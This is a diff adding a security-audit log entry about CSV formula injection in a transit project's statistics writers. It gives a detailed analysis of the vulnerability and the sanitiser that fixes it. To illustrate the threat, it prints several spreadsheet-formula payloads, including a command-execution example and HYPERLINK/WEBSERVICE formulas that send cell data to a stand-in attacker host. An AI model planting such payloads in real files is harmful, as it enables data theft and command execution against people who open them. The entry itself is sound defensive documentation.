@@ -1,3 +1,184 @@
+## 2026-05-09 - CSV Formula Injection (CWE-1236) at the Stats-Writer Boundary: `provider`, `location_name`, `direction` Persisted Verbatim Into `data/stats/*.csv`
+**Vulnerability:** `append_stammstrecke_row` and
+`append_disruption_row` (`src/utils/stats.py:219-273`, pre-fix) — the
+two append-only CSV writers that persist the project's observability
+ledgers under `data/stats/<kind>_YYYY.csv` — accepted three
+operator-/upstream-influenced text fields verbatim and handed them to
+`csv.writer` without any spreadsheet-formula neutralisation:
+
+  ```python
+  row = (
+      when.isoformat(timespec="seconds"),
+      WEEKDAY_LABELS[when.weekday()],
+      f"{when.hour:02d}",
+      direction,                                  # ← writer #1
+      _format_delay(delay_minutes),
+  )
+  ...
+  row = (
+      when.isoformat(timespec="seconds"),
+      WEEKDAY_LABELS[when.weekday()],
+      f"{when.hour:02d}",
+      provider.strip() or "unbekannt",            # ← writer #2 cell A
+      location_name.strip() or "unbekannt",       # ← writer #2 cell B
+  )
+  ```
+
+Excel, LibreOffice Calc, and Google Sheets evaluate any cell whose
+content begins with `=`, `+`, `-`, `@`, TAB (`\t`), or CR (`\r`) as a
+*formula* on file open — the OWASP "CSV Injection" / CWE-1236
+vector. The three text fields each map to a real upstream poisoning
+surface that the existing audit family had not closed:
+
+  (a) **`provider`** — `src/build_feed.py:1675` passes
+      `str(it.get("source") or "unbekannt")`. Today's providers
+      hardcode `"ÖBB"` / `"Wiener Linien"` / `"VOR/VAO"`, but
+      `src/providers/wl_fetch.py:736` and `:858` re-emit
+      `ev["source"]` and `b["source"]` *verbatim* from on-disk cache
+      entries (`cache/wl/wl_baustellen.json`, `cache/wl/events.json`)
+      — a poisoned cache file (writeable on the same runner that
+      executes the cron, so any cache-tampering primitive lands
+      here) inserts arbitrary strings into `provider`.
+  (b) **`location_name`** — extracted from upstream titles /
+      descriptions via `extract_location_name`. Today's anchored
+      `[A-ZÄÖÜ]…` regex set blocks formula prefixes by construction,
+      but the writer is a *public helper* whose contract accepts any
+      string; a future loosening of the heuristic, or any new caller
+      added under `src/utils/stats.py` users, inherits the open
+      surface.
+  (c) **`direction`** — `scripts/update_stammstrecke_status.py:735`
+      passes `direction.target_label`, which is populated at module
+      import time from `display_name(canonical_name(seed))` reading
+      `data/stations.json`. A poisoned station directory (the
+      directory file is the same on-disk write target the JSON
+      size-bomb / TOCTOU rounds named) lands arbitrary strings into
+      `direction`.
+
+Each of these three ports is the LAST gate before the string flows
+into a CSV cell that some operator will eventually open in a
+spreadsheet (the `data/stats/` ledger is the documented source for
+the dashboard regenerator and is committed to the repo for human
+inspection — `docs/statistik.md` notes the file paths verbatim, and
+the `generate-stats.yml` workflow renders them on every cron tick).
+A payload like `=cmd|'/c calc'!A1`,
+`=HYPERLINK("http://attacker.example/?d="&A1,"click")`,
+`@WEBSERVICE("http://attacker.example")`, or
+`+IFERROR(REQUEST("http://…"),0)` lands in the cell verbatim and
+fires on every operator who double-clicks the CSV — turning
+observability data into an attacker-controlled exfiltration / RCE
+amplifier. NUL / BEL / DEL / VT / FF / SI/SO control bytes were also
+preserved by `.strip()` (which only handles whitespace), and a NUL
+mid-cell silently truncates the field in some downstream CSV reader
+variants (the project's own `_iter_csv_rows` walks `csv.reader` over
+a `StringIO` — robust enough not to truncate, but the dashboard's
+provider/location keys would carry the NUL into the rendered
+Markdown indistinguishably from a legitimate cell).
+
+The whitespace-evasion sub-vector compounds the threat: the
+pre-fix writer ran `provider.strip() or "unbekannt"` *before*
+storing the cell — but `"   =cmd"` survives that strip path
+unchanged (the strip removes whitespace, leaves `"=cmd"`), and
+`"=cmd"` is the formula. Conversely `"\t=cmd".strip()` returns
+`"=cmd"` (TAB is whitespace), and any future caller that does its
+own `.strip()` before passing the value — or any future strip added
+inside the writer itself — would defang the leading TAB / CR but
+LEAVE the still-formula-prefixed remainder in place. The
+formula-prefix check therefore must run *after* whitespace is
+stripped, not before, otherwise a leading-whitespace evasion lands.
+
+**Fix:** Single new boundary sanitiser
+`_sanitize_csv_text_field` (`src/utils/stats.py:78-117`) applied to
+all three text cells in both writers, so the cartesian product of
+upstream-source / cache-poisoning / directory-poisoning / future-
+caller vectors collapses into one defence:
+
+  1. **Strip C0/C1 control bytes** — `\x00-\x08`, `\x0B`, `\x0C`,
+     `\x0E-\x1F`, `\x7F`. Excludes TAB (`\x09`), LF (`\x0A`), CR
+     (`\x0D`) from the body strip — `csv.QUOTE_MINIMAL` already
+     wraps embedded newlines and embedded TAB is benign for the
+     default `,` delimiter; *leading* TAB / CR are still defanged
+     in step 4. NUL is the principal new defence: pre-fix it
+     survived `.strip()` and could silently truncate downstream
+     CSV readers.
+  2. **Strip leading/trailing whitespace** — performed *before* the
+     formula-prefix check. A leading-whitespace payload like
+     `"   =cmd"` cannot evade the prefix branch by surviving the
+     strip step and being whitespace-collapsed by a downstream
+     consumer; the in-sanitiser strip + prefix-check ordering is
+     the *only* ordering that closes both the leading-TAB
+     (`"\t=cmd"`, where TAB is whitespace and survives no-strip)
+     and the leading-space (`"   =cmd"`, where leading space
+     bypasses the formula-prefix tuple) sub-vectors in one pass.
+  3. **Cap length** at 200 chars — second-layer clamp at the CSV
+     boundary defending against an unbounded operator-controlled
+     string inflating per-row footprint, even if a future
+     `extract_location_name` change drops the `_normalise_location`
+     80-char clamp.
+  4. **Prepend `'`** to any value beginning with one of `=`, `+`,
+     `-`, `@`, `\t`, `\r`. The OWASP-recommended apostrophe is
+     hidden in spreadsheet display but forces the cell to be parsed
+     as text; operators reading the raw CSV still see the (defanged)
+     payload, which preserves the indicator-of-compromise signal
+     instead of silently dropping the attack value.
+
+Numeric cells (`delay_minutes`) are exempt: `_format_delay` already
+emits a `f"{round(float(...), 2):.2f}"` numeric string, and
+re-quoting `"-5.00"` would break the dashboard aggregator's
+`float(row["delay_minutes"])` parse path. The numeric-only domain
+guarantees the `-` prefix is always a real number, never an
+attacker-controlled formula.
+
+**Learning:** When a writer persists data that will later be opened
+in *any* spreadsheet application — Excel, LibreOffice Calc, Google
+Sheets, Numbers, the GitHub web UI's CSV preview — the cell
+boundary is a security perimeter equal to a published-feed URL or a
+log line: every text field that flows in from upstream / cache /
+directory must be neutralised, regardless of whether *any current
+caller* exercises the path. The defence-in-depth contract collapses
+the cartesian product of (source path × poisoning vector × future
+caller × spreadsheet-app evaluator) into a single sanitiser at the
+writer.
+
+The whitespace-ordering sub-pattern carries: a defang that runs
+*before* a downstream `.strip()` (or that runs `.strip()` *before*
+the formula-prefix check) leaves a leading-whitespace evasion live.
+The only ordering that closes the cartesian product of (leading
+TAB / leading CR / leading space / inner formula-prefix-after-
+whitespace) is *strip-then-prefix-check*, performed inside the
+sanitiser so no caller can re-introduce the gap by doing its own
+strip before sanitising. The `or "unbekannt"` fallback must follow
+the sanitiser, not precede it, otherwise a payload that sanitises
+to empty string (e.g. all control bytes) would leak the empty
+string before the fallback runs.
+
+The numeric-vs-text domain split also carries: `_format_delay`'s
+guarantee that `delay_minutes` always renders as a numeric string
+makes the `-` prefix safe (every `-N.NN` is a real number, not a
+formula). Sanitising it would *break* the dashboard's `float(...)`
+re-parse and create a worse cascade than the threat. Mark every
+non-text cell explicitly with the typed-format guarantee that
+licenses its bypass.
+
+**Prevention:** Every new public CSV / TSV / spreadsheet-bound
+writer must apply `_sanitize_csv_text_field` (or a sibling
+sanitiser) to every text field at the writer boundary, with the
+strip-then-prefix-check ordering pinned inside the sanitiser. Grep
+for `csv.writer\|csv.DictWriter\|writerow\(\|writerows\(` across
+`src/` and `scripts/` and verify each text field flows through a
+formula-prefix defang. Markdown rendering of the same fields
+(`scripts/generate_markdown_stats.py:585,600,511` — Markdown table
+cells `f"| {direction} | {count} |"` interpolate the *same*
+upstream-influenced strings without escaping `|` / `*` / `` ` `` /
+`<` / `>` / `[`) is a sibling drift candidate flagged here for the
+next round: defanging at the CSV write does NOT cover the
+markdown-injection axis when the same data is re-rendered into
+`docs/statistik.md`. Future audits should also look at any
+`json.dump`-style writer whose output is later opened in a
+*spreadsheet importer* (CSV import wizards in Excel happily evaluate
+a JSON-then-CSV-converted cell) and, more broadly, every on-disk
+serialiser whose downstream consumer set includes a tool that
+evaluates leading `=` / `+` / `-` / `@` / `\t` / `\r` as a formula.
+
 ## 2026-05-09 - Public Feed URL Allow-List Drift: HTTP-Scheme Acceptance + `.github.io` Sub-Subdomain Wildcard + Empty / Dash-Prefixed Subdomain (Allow-List Drift Round, Validator Boundary)
 **Vulnerability:** `validate_public_feed_url`
 (`src/utils/http.py:1241-1261`, pre-fix) — the validator that pins
